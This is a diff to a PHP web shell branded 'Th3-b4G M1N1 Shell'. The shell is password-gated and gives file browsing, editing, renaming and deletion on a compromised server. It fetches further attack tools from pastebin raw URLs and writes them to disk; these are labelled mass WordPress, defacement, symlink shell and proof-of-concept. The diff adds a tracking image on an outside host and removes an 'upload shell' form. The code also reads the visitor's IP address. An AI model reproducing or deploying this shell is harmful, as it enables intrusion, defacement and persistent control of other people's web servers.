@@ -6,7 +6,7 @@
 $create_password = true;
 $password = "xfarian";
 ######ver####
-$ver= "v1.0";
+$ver= "v21";
 #############
 @$pass=$_POST['pass'];
 if($pass==$password){
@@ -53,7 +53,7 @@ if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = strips
 <!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>M1n1-b4G</title>
 <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
 <style type="text/css">body{background: #263238;color:#eceff1;font-family:'Courier';margin:0;font-size: 14px;}h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:#ef6c00;color:#eceff1;}a{color:#ef6c00;text-decoration:none;font-family:'Courier'}textarea{width:900px;height:250px;background:transparent;border:1px dashed #ef6c00;color:#ef6c00;padding:2px;}tr.first{border-bottom:1px dashed #ef6c00;}tr:hover{background: #7f2e00;}th{background: #ef6c00;padding:5px;}</style>
-</head><body> <?php echo'<div style="color:#ef6c00;margin-top:0;"><h1><center>Th3-b4G M1N1 Shell</center></h1></div>';
+</head><body> <?php echo'<div style="color:#ef6c00;margin-top:0;"><h1><center>Th3-b4G M1N1 Shell<br><img src="http://poligon.ricoroco.com/fora/smf/decoder/e.gif"></center></h1></div>';
 if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
 $path = str_replace("\\","/",$path);$paths = explode("/", $path);
 echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
@@ -118,7 +118,7 @@ echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
 echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
 echo '</table></div>';}echo '</body></html>';
 function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
-echo'<br><center>&copy; 2021 - <a href="fb.me/th3-b4g">Th3-b4G</a>.</center><br>';?>
+echo'<br><center>&copy; 2021 - <a href="http://fb.me/th3-b4g">Th3-b4G</a>.</center><br>';?>
 <center><?php
 error_reporting(0);
 if ($_GET['im']=='xfarianxxx') {
@@ -128,8 +128,7 @@ echo "<code><a href='xsym.php'>SYM-SHELL </a><code>";
 } else {
     echo "<code><a href='?im=xfarianxxx'>SYM-SHELL </a></code>";
 }
-?>
-<?php
+
 error_reporting(0);
 if ($_GET['im']=='mass') {
 $xfarian=file_get_contents('https://pastebin.com/raw/zkCGrg4n');
@@ -138,8 +137,7 @@ echo "<a href='mass.php'>WP-MASS </a>";
 } else {
     echo "<a href='?im=mass'>WP-MASS </a>";
 }
-?>
-<?php
+
 error_reporting(0);
 if ($_GET['its']=='poc') {
 $xfarian=file_get_contents('https://pastebin.com/raw/5AgiZxER');
@@ -148,8 +146,6 @@ echo "<code><a href='poc.txt'>TXT-POC </a><code>";
 } else {
     echo "<code><a href='?its=poc'>TXT-POC </a></code>";
 }
-?>
-<?php
 error_reporting(0);
 if ($_GET['im']=='xfarianx') {
 $xfarian=file_get_contents('https://pastebin.com/raw/KWxhPrAG');
@@ -158,18 +154,7 @@ echo "<code><a href='xbug.php'>DEFAGE </a><code>";
 } else {
     echo "<code><a href='?im=xfarianx'>DEFAGE </a></code>";
 }
-?>
 
-<?php
-$do  = $_GET['do'];
-if($do== 'it'){
-$doshell = $_FILES['file']['name'];
-$doit  = $_FILES['file']['tmp_name'];
-echo "<form method='POST' enctype='multipart/form-data'>
- <input type='file'name='file' />
- <input type='submit' value='upload shell' />
-</form>";
-move_uploaded_file($doit,$doshell);
 }
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
